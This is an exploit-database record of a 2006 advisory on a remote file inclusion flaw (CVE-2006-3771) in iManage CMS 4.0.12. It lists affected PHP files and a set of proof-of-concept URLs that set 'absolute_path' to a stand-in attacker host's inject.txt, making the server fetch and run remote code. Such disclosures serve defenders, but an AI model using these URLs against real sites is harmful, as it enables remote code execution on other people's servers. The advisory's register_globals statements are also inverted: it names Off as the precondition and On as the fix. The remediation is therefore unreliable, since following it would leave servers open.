{
  "id": "2046",
  "title": "iManage CMS 4.0.12 - &#039;absolute_path&#039; Remote File Inclusion",
  "cve": "CVE-2006-3771",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_40$2006\r\n\r\n---------------------------------------------------------------------------------------------------\r\n[ECHO_ADV_40$2006] iManage CMS <= 4.0.12 (absolute_path) Remote File Inclusion\r\n---------------------------------------------------------------------------------------------------\r\n\r\nAuthor          : Ahmad Maulana a.k.a Matdhule\r\nDate Found      : July, 20th 2006\r\nLocation        : Indonesia, Jakarta\r\nweb             : http://advisories.echo.or.id/adv/adv40-matdhule-2006.txt\r\nCritical Lvl    : Highly critical\r\nImpact          : System access\r\nWhere           : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~\r\niManage CMS from Imaginex-Resource\r\n\r\nApplication     : iManage CMS\r\nversion         : 4.0.12 stable\r\nURL             : http://www.imaginex-resource.com\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~\r\n\r\n-----------------------component.php----------------------\r\n....\r\n<?php\r\n/**\r\n*    iManage Version 4.0.12\r\n*    Dynamic portal server and Content managment engine\r\n*    03-02-2003\r\n*\r\n*    Copyright (C) 2000 - 2003 Imaginex-Resource\r\n*\r\n*    Site Name: iManage Version 4.0.12\r\n*    File Name: rightComponent.php\r\n*    Date: 31/01/2003\r\n*     Version #: 4.0.12\r\n*    Comments: Display all modules which are to be displayed on the right.\r\n**/\r\n\r\ninclude($absolute_path.'/language/'.$lang.'/lang_components.php');\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"absolute_path\" parameter in component.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources\r\n\r\nAffected files: \r\n\r\narticles.php\r\ncontact.php\r\ndisplaypage.php\r\nfaq.php\r\nmainbody.php\r\nnews.php\r\nregistration.php\r\nwhosOnline.php\r\ncomponents/com_calendar.php\r\ncomponents/com_forum.php\r\ncomponents/minibb/index.php\r\ncomponents/minibb/bb_admin.php\r\ncomponents/minibb/bb_plugins.php\r\nmodules/mod_calendar.php\r\nmodules/mod_browser_prefs.php\r\nmodules/mod_counter.php\r\nmodules/mod_online.php\r\nmodules/mod_stats.php\r\nmodules/mod_weather.php\r\nthemes/bizz.php\r\nthemes/default.php\r\nthemes/simple.php\r\nthemes/original.php\r\nthemes/portal.php\r\nthemes/purple.php\r\n\r\nand more :)\r\n\r\nSuccessful exploitation requires that \"register_globals= Off \".\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[path]/articles.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/contact.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/displaypage.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/faq.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/mainbody.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/news.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/registration.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/whosOnline.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/components/com_calendar.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/components/com_forum.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/components/minibb/index.php?absolute_path=http://attacker.com//inject.txt?\r\nhttp://target.com/[path]/modules/mod_calendar.php?absolute_path=http://attacker.com//inject.txt?\r\n\r\nand more Affected files\r\n\r\n\r\nSolution:\r\n~~~~~\r\n- Change register_globals= On \r\n  in php.ini\r\n- Sanitize variable $absolute_path on affected files.\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~\r\n~ solpot a.k.a chris, J4mbi  H4ck3r for the hacking lesson  :) \r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous\r\n~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama\r\n~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com\r\n~ #mardongan #jambihackerlink #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~\r\n \r\n     matdhule[at]gmail[dot]com\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-07-20]",
  "url": "https://www.exploit-db.com/exploits/2046"
}